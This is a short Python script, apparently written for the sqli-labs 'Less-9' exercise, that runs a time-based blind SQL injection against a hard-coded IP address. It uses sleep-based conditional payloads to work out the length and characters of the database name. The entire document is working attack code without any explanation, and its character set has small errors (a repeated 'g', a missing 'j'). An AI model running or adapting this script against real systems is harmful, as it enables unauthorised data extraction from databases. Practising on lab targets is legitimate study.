import requests
value ="abcdefghigklmnopqrstuvwxyz@_."
data=""
#查数据库长度
url = "http://47.104.232.176:9002/Less-9/?id=1' and if((substr(({0}),{1},1)='{2}'),sleep(5),NULL); %23"
#查数据库名
url_length="http://47.104.232.176:9002/Less-9/?id=1' and if((length(({0}))={1}),sleep(5),NULL); %23"
#查数据库长度
def get_length(payload):
    for n in range(1,100):
        url= url_length.format(payload,n)
        print(url)
        if(get_respone(url)):
            print("[+] length is {0}".format(n))
            return n
#查数据库名
def get_data(payload,value,length):
    for n in range(1,length):
        for v in value :
            url_data = url.format(payload,n,v)
            print(url_data)
            if(get_respone(url_data)):
                global data
                data=data+v
                print("[+] data is {0}".format(data))
                break
def get_respone(url):
    try:
        html = requests.get(url,timeout=4)
        return False
    except Exception as e:
        print("......")
        return True
databse_payload ="select database()"
get_data(databse_payload,value,get_length(databse_payload)+1)
